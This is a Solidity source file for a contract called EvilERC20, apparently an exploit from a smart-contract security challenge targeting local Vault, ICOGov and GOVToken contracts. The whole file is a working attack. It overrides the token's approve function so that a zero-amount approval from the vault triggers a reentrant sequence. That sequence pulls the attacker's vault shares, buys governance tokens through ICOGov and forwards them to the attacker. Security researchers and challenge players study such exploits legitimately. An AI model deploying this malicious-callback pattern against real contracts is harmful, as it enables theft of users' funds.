//SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "./Vault.sol";
import "./ICOGov.sol";
import "./GOVToken.sol";

contract EvilERC20 is ERC20 {

    Vault vault;
    ICOGov icoGov;
    address attackerAddr;
    GOVToken govToken;

    constructor(Vault _vault, ICOGov _icoGov, GOVToken _govToken) ERC20("EvilToken", "EVIL") {
        vault = _vault;
        icoGov = _icoGov;
        attackerAddr = msg.sender;
        govToken = _govToken;
        _mint(attackerAddr, 3000000 ether);
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, amount);
        // Trigger the attack
        if (amount == 0 && owner == address(vault)) {
            // Transfer $VT from attacker
            uint256 share = vault.balanceOf(attackerAddr);
            vault.transferFrom(attackerAddr, address(this), share);

            // Approve $VT to be used by ICOGov
            vault.approve(address(icoGov), share);

            // Buy the token
            icoGov.buyToken(share);

            // Transfer token bought back to the attacker
            govToken.transfer(attackerAddr, govToken.balanceOf(address(this)));
        }
        return true;
    }
}
